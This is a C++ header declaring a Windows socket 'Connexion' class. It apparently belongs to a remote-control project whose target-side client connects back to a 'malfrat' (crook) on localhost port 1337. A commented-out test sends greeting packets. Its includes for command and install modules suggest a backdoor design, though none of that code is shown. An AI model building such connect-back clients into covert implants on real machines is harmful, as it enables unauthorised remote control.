//
// Created by Berlingot on 2023-04-20.
//

#ifndef SERVEUR___CIBLE_CONNEXION_H
#define SERVEUR___CIBLE_CONNEXION_H
#include "../MyPNet/IncludeMe.h"
#include "string"
#include <chrono>
#include <thread>
#include "ConnexionType.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "installationAndStart.h"
#include "CMD.h"

class Connexion {
private:
    MyPNet::Socket _socket;
    bool pirateTrouvee = false;
    ConnexionType connexiontype;
    SOCKET Connection;//This client's connection to the server
    SOCKADDR_IN adresseIP;
    const char * adresseIPm;
    unsigned short port;
    ConnexionType ConnexionTypearg;
    static void processConnexion();
    bool ProcessPacketType(MyPNet::PacketType  _PacketType);

    bool GetString(std::string & _string);
    bool Sendint32_t(int32_t _int32_t);
    bool SendPacketType(MyPNet::PacketType _PacketType);
    bool sendall(char * data, int totalbytes);
public:
    static Connexion * connexionptrreference; //clientptr
    static bool connected;
    bool SendString(std::string _string, MyPNet::PacketType _packettype);
    Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg);
    MyPNet::Socket* getSocket() {return &_socket;}
    bool Connect();
    bool CloseConnection();
    bool identificationPacketTyoe(MyPNet::PacketType & _packettype);
    bool Getint32_t(int32_t & _int32_t);
    bool recvall(char * data, int totalbytes);
};


#endif //SERVEUR___CIBLE_CONNEXION_H


/*
     if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            if (socket.ConnectTo(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout <<"Nouvelle connexion établie vers le malfrat!" << std::endl;

                //send paquets

                MyPNet::Packet stringpacket(MyPNet::PacketType::PT_ChatMessage), intpacket(MyPNet::PacketType::PT_IntegerArray);
                stringpacket << std::string ("Bonjour");
                uint32_t arraySize = 4;
                uint32_t integerArray[4] = {1,2,3,4};
                intpacket << arraySize;


                while(true){
                    MyPNet::PResult result;
                    std::cout <<"envoie" << std::endl;

                    if(rand()%2==0){
                        result = socket.SendPaquets(stringpacket);
                    } else{
                        result = socket.SendPaquets(intpacket);
                    }
                }

                //
            } else{
                std::cout << "Échec de connexion, le malfrat n'a pu être trouvé..."<<std::endl;
            }
            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;

 */